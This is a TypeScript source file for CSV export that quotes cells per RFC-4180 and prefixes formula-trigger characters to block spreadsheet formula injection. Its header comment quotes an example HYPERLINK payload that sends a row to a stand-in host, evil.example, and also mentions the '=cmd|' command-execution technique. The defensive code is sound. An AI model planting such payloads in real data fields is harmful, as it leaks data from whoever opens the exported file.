// CSV serialisation for the export endpoints.
//
// Two escaping problems live here, and they are not the same problem:
//
// 1. RFC-4180 quoting — a value containing a comma, quote or newline must be wrapped in
//    quotes with internal quotes doubled. Get this wrong and the file is merely broken.
//
// 2. FORMULA INJECTION — a cell beginning with `=`, `+`, `-`, `@`, tab or carriage
//    return is interpreted by Excel, Sheets and LibreOffice as a FORMULA when the file
//    is opened. `=HYPERLINK("https://evil.example?x="&A1,"Click")` in a lead's name
//    field exfiltrates the row the moment an admin double-clicks the export; `=cmd|…`
//    has historically reached command execution. This matters here specifically because
//    every cell in these exports is attacker-supplied: the lead form is a public
//    endpoint, and the person filling it in chooses their own "name".
//
//    The fix is to prefix such cells with a single quote, which spreadsheets treat as
//    "the rest is literal text". It is applied BEFORE RFC-4180 quoting, because the
//    guard has to end up inside the quoted value rather than outside it.

const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

function neutralizeFormula(value: string): string {
  if (value.length === 0) return value;
  const first = value[0] as string;
  return FORMULA_TRIGGERS.includes(first) ? `'${value}` : value;
}

function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  const raw = typeof value === 'string' ? value : String(value);
  const guarded = neutralizeFormula(raw);
  return `"${guarded.replace(/"/g, '""')}"`;
}

/**
 * Serialises `records` under `header`, in header order.
 *
 * The BOM is deliberate: without it Excel on Windows decodes UTF-8 as the system
 * codepage, and this is a bilingual product whose lead names are routinely Arabic.
 * A mojibake export is a support ticket every single time.
 */
export function toCsv(
  header: readonly string[],
  records: readonly Record<string, unknown>[],
): string {
  const lines: string[] = [header.map(escapeCell).join(',')];
  for (const record of records) {
    lines.push(header.map((column) => escapeCell(record[column])).join(','));
  }
  return `﻿${lines.join('\r\n')}\r\n`;
}
